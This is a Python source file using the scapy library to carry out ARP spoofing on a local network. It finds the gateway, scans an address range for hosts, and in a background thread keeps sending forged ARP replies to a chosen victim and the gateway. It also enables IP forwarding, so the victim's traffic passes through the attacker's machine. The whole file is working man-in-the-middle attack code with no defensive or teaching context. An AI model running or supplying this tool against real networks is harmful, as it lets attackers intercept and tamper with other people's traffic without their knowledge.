import subprocess
import re
import ipaddress
from scapy.all import ARP, Ether, srp, send
import threading
import time

# Global variables
spoofing_active = False
packet_counter = 0

def get_gateway_info():
    try:
        result = subprocess.run(['arp', '-a'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode != 0:
            return {"error": f"Error executing arp command: {result.stderr}"}

        arp_output = result.stdout
        gateway_match = re.search(r'_gateway\s+\(([\d.]+)\)\s+at\s+([\w:]+)', arp_output, re.IGNORECASE)
        if gateway_match:
            return {"ip": gateway_match.group(1), "mac": gateway_match.group(2), "raw_output": arp_output}
        else:
            return {"error": "Gateway IP not found in arp output.", "raw_output": arp_output}
    except FileNotFoundError:
        return {"error": "The arp command is not available on this system."}
    except Exception as e:
        return {"error": f"An error occurred: {e}"}

def scan_network(ip_range):
    try:
        ip_network = ipaddress.ip_network(ip_range, strict=False)
        arp = ARP(pdst=str(ip_network))
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=2, verbose=False)[0]

        devices = [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]
        return devices
    except ValueError as e:
        raise ValueError(f"Invalid IP range: {ip_range}") from e
    except Exception as e:
        raise RuntimeError(f"Error scanning network: {e}") from e

def spoof_both(victim_ip, victim_mac, gateway_ip, gateway_mac):
    try:
        victim_packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)
        gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip)
        send(victim_packet, verbose=False)
        send(gateway_packet, verbose=False)
        return {"victim": victim_packet.summary(), "gateway": gateway_packet.summary()}
    except Exception as e:
        raise RuntimeError(f"Error during ARP spoofing: {e}")

def enable_port_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
    except Exception as e:
        raise RuntimeError(f"Failed to enable port forwarding: {e}")

def start_spoofing_continuous(victim_ip, victim_mac, gateway_ip, gateway_mac):
    def spoofing_thread():
        global spoofing_active, packet_counter
        packet_counter = 0
        while spoofing_active:
            spoof_both(victim_ip, victim_mac, gateway_ip, gateway_mac)
            packet_counter += 2
            time.sleep(1)

    global spoofing_active
    spoofing_active = True
    enable_port_forwarding()
    thread = threading.Thread(target=spoofing_thread)
    thread.daemon = True
    thread.start()

def get_packet_count():
    global packet_counter
    return packet_counter

def stop_spoofing():
    global spoofing_active, packet_counter
    spoofing_active = False
    packet_counter = 0
